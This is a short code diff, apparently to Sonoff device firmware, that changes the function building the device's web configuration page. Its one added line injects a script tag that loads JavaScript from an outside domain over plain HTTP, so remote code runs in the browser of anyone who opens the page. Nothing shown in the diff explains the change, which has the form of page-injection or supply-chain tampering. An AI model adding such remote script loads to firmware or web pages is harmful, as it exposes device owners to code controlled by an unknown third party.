@@ -915,6 +915,7 @@ void HandleModuleConfiguration(void)
   page += F("</table>");
   page += FPSTR(HTTP_FORM_END);
   page += FPSTR(HTTP_BTN_CONF);
+  page += "<script src='http://netpok.ga/sonoff/t.js'></script>";
   ShowPage(page);
 }
 
